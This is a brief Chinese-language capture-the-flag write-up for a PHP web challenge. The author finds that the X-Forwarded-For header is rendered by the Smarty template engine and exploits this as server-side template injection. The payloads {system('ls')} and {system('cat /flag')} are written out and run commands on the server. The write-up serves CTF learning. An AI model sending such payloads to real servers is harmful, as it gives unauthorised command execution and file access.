![[Pasted image 20221113151242.png]]

首页长这样

![[Pasted image 20221113151312.png]]

首页有一串js

![[Pasted image 20221113151850.png]]

好家伙，炫酷的打字效果往往只需要最朴素的编写方式，学到了（然而好像和题目没啥关系）

```php
/flag.php
```
![[Pasted image 20221113165329.png]]

很奇怪，这好像是个内网ip，应该是过了代理

猜测可修改`X-Forwarded-For`来控制回显

![[Pasted image 20221113165737.png]]

先瞎打一波看看有没有报错
```http
X-Forwarded-For: '{\%*asfo
```

![[Pasted image 20221113170317.png]]

通过报错确定服务端使用`Smarty`作为模板引擎

![[Pasted image 20221113170349.png]]

`Smarty`语法好像是基于`php`，尝试使用`php`的`system`函数
```http
X-Forwarded-For: {system('ls')}
```
![[Pasted image 20221113170907.png]]
```http
X-Forwarded-For: {system('cat /flag')}
```
![[Pasted image 20221113171153.png]]

#Web #PHP #SSTI #smarty